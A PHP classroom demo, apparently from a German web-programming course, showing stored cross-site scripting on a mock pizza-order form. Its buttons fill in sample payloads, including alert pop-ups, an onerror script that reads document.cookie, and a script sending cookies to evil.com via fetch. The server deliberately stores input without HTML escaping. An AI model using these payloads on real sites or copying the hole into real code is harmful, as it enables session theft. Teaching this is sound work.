<?php // UTF-8 marker äöüÄÖÜß€

class XssDemo
{
	protected MySQLi $database;
	protected string $address;
	protected string $name;

    protected function __construct()
    {
        // activate full error checking
        error_reporting(E_ALL);

		$host = "localhost";
		/********************************************/
		// This code switches from the the local installation (XAMPP) to the docker installation 
		if (gethostbyname('mariadb') != "mariadb") { // mariadb is known?
			$host = "mariadb";
		}
		$database = "XSS_Demo";
		$user = "public";
		$pwd = "public"; //NOSONAR ignore inline password for demo

        // open database
        $this->database = new MySQLi($host, $user, $pwd, $database);
        // check connection to database
        if ($this->database->connect_errno) {
            throw new Exception("Connect failed: " . $this->database->connect_errno);
        }
        // set character encoding to UTF-8
        if (!$this->database->set_charset("utf8")) {
            throw new Exception("Fehler beim Laden des Zeichensatzes UTF-8: " . $this->database->error);
        }
				
		$sql = "INSERT INTO `attack`(`NameUnmodified`, `NameHTMLSpecialChar`, `AddressUnmodified`) VALUES ('Dummy','HTML_Dummy','DummyAdress')";
		$this->database->query($sql);
    }

    public function __destruct()
    {
        $this->database->close();
    }
	
    
    protected function generateView()
    {
        echo<<<EOT
	<!DOCTYPE html>
	<html lang="de">  
	  <head>
		<meta charset="UTF-8" />
		<style>
			img {width:100vw; }
		</style>
		<title>Cross-Site-Scripting</title>
	  <script>
		function fillInput(id,no){
			let colorTest ="<script>document.getElementsByTagName(\"body\")[0].style.background = \"red\";<\/script>";
			let address = "Hauptweg 8, Darmstadt";
			let angriff = Array();
			angriff[0] = address;
			angriff[1] = "<iframe onload=\"alert('ich nerve gerne');\" src=\".\" width=\"0px\" height=\"0px\"><\/iframe>"+colorTest+address;
			angriff[2] = "<img src=\"http:\/\/url.to.file.which\/not.exists\" onerror= \"alert(document.cookie);\" \/>"+colorTest;
			angriff[3] = "<script>function x(){fetch('https:\/\/evil.com\/hack?id=' + document.cookie);}<\/script><iframe onload=\"x()\" src=\".\" width=\"0px\" height=\"0px\"\/>evil"+colorTest;
			angriff[4] = colorTest + address;
			document.getElementById(id).value=angriff[no];
			document.getElementById(id).setAttribute("value",angriff[no]);
		}
	  </script>
	  </head>
	  <body >
		<header><h1>Cross-Site-Scripting</h1></header>
		
	  <img src="XSS_Demo_Order.jpg" alt="Snapshot vom Pizzaservice. Sorry, Sie müssen die Praktikumsaufgabe selbst lösen!" />
	  <form method="post" accept-charset="UTF-8" action="XSS_Demo_Order.php">
	  <p>	  
		<input name="name" id="name" type="text" size="20" value="Müller & Söhne" readonly/>		
		<input name="address" id="address" type="text" placeholder="Ihre Straße" size="90" value=""/>
		<input id="submit" type="submit" value="Bestellen"  />
	  </p>
		  </form>
		  <fieldset>
	  <legend>Beispiel-Eingaben (anklicken und mit dem Bestellknopf abschicken)</legend>
	  <label>
	  	<input type="button" value="Normale Eingabe" onclick="fillInput('address',0);" />
		Eine normale Adresse wie es ein echter Kunde eingeben würde
	  </label><br/>
	  <label>
	  	<input type="button" value="XSS-Test" onclick="fillInput('address',4);" />
		Setzt die Hintergrundfarbe - wenn das übergebene Script-Tag ausgeführt wird, kann man jedes Skript ausführen
	  </label><br/>
	  <label>
		<input type="button" value="Angriff 1" onclick="fillInput('address',1);" />
		Man kann den Webseitenbetreiber mit Popups nerven
	  </label><br/>
	  <label>
		<input type="button" value="Angriff 2" onclick="fillInput('address',2);" />
		Man kann Cookies (und damit oft die SessionID) auslesen und als Popup anzeigen (oder auch ins Internet weiterleiten)
	  </label><br/>
	  <label>
		<input type="button" value="Angriff 3" onclick="fillInput('address',3);" />
		So sieht eine versteckte Weiterleitung aus. Erkennbar im Debugger unter "Netzwerk".
		Wenn man Glück hat, sperrt der Browser diesen Angriff!
	  </label><br/>
	  </fieldset>
<!--
		<h2>Lesenswert:</h2>
<a href="https://www.theserverside.com/news/1365146/Redirect-After-Post">Redirect after POST</a></br>
<a href="https://en.wikipedia.org/wiki/Post/Redirect/Get">Post/Redirect/Get</a>
-->
</body></html>
EOT;
    }

    protected function processReceivedData()
    {			
        if (isset($_POST["address"])&& isset($_POST["name"])) {	
			
			//delete all entries from table
			$sql = "DELETE FROM attack;";
			$recordset = $this->database->query($sql);
		    if (!$recordset) {
				throw new Exception("Abfrage fehlgeschlagen: " . $this->database->error);
			}			
			
			$this->name = $_POST["name"];	
            $this->address = $_POST["address"];	
			
			// escape new entries
			$HTMLname = $this->database->real_escape_string(htmlentities($this->name));	// All escape you can get!? No good!
			$this->name = $this->database->real_escape_string($this->name);

			$this->address = $this->database->real_escape_string($this->address);			

			// insert new entry			
			$sql = "INSERT INTO `attack`(`NameUnmodified`, `NameHTMLSpecialChar`, `AddressUnmodified`) VALUES ('$this->name','$HTMLname','$this->address')";

			$recordset = $this->database->query($sql);
			
			if (!$recordset) {
				throw new Exception("Abfrage fehlgeschlagen: " . $this->database->error);
			}
			
			header("HTTP/1.1 303 See Other");
			header("Location: XSS_Demo_Order.php");
        }
		
    }


    public static function main()
    {
        try {
          session_start();
            $page = new XssDemo();
            $page->processReceivedData();
            $page->generateView();
        } catch (Exception $e) {
            //header("Content-type: text/plain; charset=UTF-8");
            header("Content-type: text/html; charset=UTF-8");
            echo $e->getMessage();
        }
    }
}

XssDemo::main();
